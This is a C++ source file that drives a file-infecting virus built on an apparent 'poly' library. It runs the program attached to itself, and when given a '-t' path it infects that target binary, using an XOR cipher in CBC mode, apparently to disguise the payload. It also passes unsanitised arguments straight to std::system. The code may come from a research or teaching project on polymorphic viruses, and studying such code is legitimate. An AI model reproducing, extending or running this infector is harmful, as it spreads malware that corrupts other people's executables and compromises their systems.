#include <cstdlib>

#include <iostream>

#include <poly/host_properties.hpp>
#include <poly/virus.hpp>

int arg_pass_from = 1;

// Assumo che il valore restituito rappresenti un path valido che punti a un
// file
struct TargetSelectPolicy {
    poly::fs::path next_target(poly::fs::path) noexcept { return {}; }
};

struct BlockingExec {
    BlockingExec() noexcept : result_{0} {};

    void exec(const poly::fs::path &program, int argc, char **const argv,
              char **const envp) noexcept {
        std::string cmd = program.string();

        for (auto i = arg_pass_from; i < argc; i++) {
            cmd += " " + std::string(argv[i]);
        }

        this->result_ = std::system(cmd.c_str());
#ifndef POLY_WINDOWS
        this->result_ = WEXITSTATUS(this->result_);
#endif
    }

    inline void wait() noexcept { return; }

    inline int get_result() const noexcept { return this->result_; }

  private:
    int result_;
};

using Cipher = poly::Cipher<
    poly::CipherMode::kCBC,
    poly::EncryptionAlgorithm<poly::EncryptionAlgorithmType::kXor>>;

int main(int argc, char **argv, char **envp) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " [options] [<args..>]\n";
        std::cerr << "OPTIONS:\n";
        std::cerr << "\t-t <target_path>\tPath where the binary to infect is "
                     "placed.\n";
        std::cerr << "\tOther arguments will be passed to the attached "
                     "binary, if present.\n";

        return 1;
    }

    auto virus = poly::Virus<TargetSelectPolicy, BlockingExec, Cipher>::build(
        argc, argv, envp);

    if (virus == nullptr) {
        return 1;
    }

    std::string target = "";
    if (std::string(argv[1]) == "-t") {
        arg_pass_from += 2;
        target = std::string(argv[2]);
    }

    auto res = virus->exec_attached_program();
    bool has_attached_bin = res == poly::Error::kNone;

    if (res != poly::Error::kNone && res != poly::Error::kNoTargetAttached) {
        return 1;
    }

    if (!std::string(target).empty() &&
        virus->infect_next(target) != poly::Error::kNone) {
        return 1;
    }
    virus->wait_exec_end();

    if (has_attached_bin) {
        return virus->exec_result();
    } else {
        return 0;
    }
}